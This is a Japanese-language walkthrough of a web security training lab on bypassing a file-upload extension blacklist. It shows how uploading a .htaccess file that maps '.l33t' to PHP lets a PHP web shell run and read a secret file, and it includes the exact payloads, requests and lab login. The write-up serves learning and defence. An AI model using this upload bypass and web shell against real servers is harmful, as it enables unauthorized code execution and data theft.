## Lab: Web shell upload via extension blacklist bypass
	

## 攻撃の流れ

```
.php はブラックリストで拒否される
　　↓
.htaccess をアップロードして「.l33t = PHP」と設定
　　↓
exploit.l33t をアップロード（ブラックリック回避）
　　↓
exploit.l33t が PHP として実行される
　　↓
Carlos の秘密を取得！
```

---

## STEP 1: ログイン & 画像アップロード
- `wiener:peter` でログイン
- 普通の画像をアバターとしてアップロード

## STEP 2: Repeater にリクエストを送る
- `POST /my-account/avatar` → **タブB**
- `GET /files/avatars/<画像>` → **タブA**

## STEP 3: .htaccess をアップロード（タブB）
```
filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
```

## STEP 4: exploit.l33t をアップロード（タブB）
```
filename="exploit.l33t"
Content-Type: text/plain

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

## STEP 5: PHPシェルを実行（タブA）
```
GET /files/avatars/exploit.l33t
```
→ レスポンスに秘密が表示される

## STEP 6: Submit solution で提出！

---



## STEP 1: なぜ普通の画像をアップロードしたのか？

普通の画像をアップロードしたのは、**サーバーがどこに画像を保存するか確認するため**

Burp の HTTP history を見ると：
```
GET /files/avatars/<画像ファイル名>
```

というリクエストが見つかります。これで「アップロードしたファイルは `/files/avatars/` に保存される」とわかりました。


## STEP 2: なぜ .php をアップロードしなかったのか？

本来やりたいことは：

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

これを `exploit.php` としてアップロードして実行することです。

でも試すと**サーバーに拒否される**んです。

```
.php はブラックリストに登録されている → ❌ 拒否
```

なので「**.php を使わずに PHP を実行する方法**」を考える必要がありました。


## STEP 3: .htaccess って何？

Apache サーバーには `.htaccess` という特別なファイルがあります。

これは**そのディレクトリのルールを設定できるファイル**です。

今回アップロードしたのは：

```
AddType application/x-httpd-php .l33t
```

これは Apache に対して：

```
「.l33t という拡張子のファイルは PHP として実行しろ」
```

と命令しています。

つまり `.htaccess` を `/files/avatars/` にアップロードすることで、**そのフォルダのルールを書き換えた**わけです！


## STEP 4: なぜ exploit.l33t をアップロードしたのか？

STEP 3 で `.htaccess` によって：

```
.l33t = PHP として実行する
```

というルールを設定しました。

なので今度は中身が PHP のファイルを `.l33t` という拡張子でアップロードします：

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

サーバー側の判断はこうなります：

```
exploit.l33t が来た
　　↓
.l33t はブラックリストに登録されていない → ✅ 許可
　　↓
.htaccess のルールで .l33t は PHP として実行
　　↓
Carlos の秘密を読み取って返す
```

ブラックリストは `.php` しか見ていないので `.l33t` は素通りできたわけです！


## STEP 5: なぜ GET リクエストで秘密が取得できたのか？

タブA で：

```
GET /files/avatars/exploit.l33t
```

を送信しました。

これは「このファイルを見せてくれ」というリクエストです。

普通のファイルなら**そのまま中身を返す**だけですが：

```
exploit.l33t にアクセス
　　↓
Apache が .htaccess のルールを確認
　　↓
「.l33t は PHP として実行しろ」
　　↓
<?php echo file_get_contents('/home/carlos/secret'); ?> が実行される
　　↓
/home/carlos/secret の中身が返ってくる
　　↓
m9t1GEAfVWUSatGoBxjzHXCzNgIGFpbp
```

**ファイルを「見る」つもりが「実行」されていた**というのがポイントです！

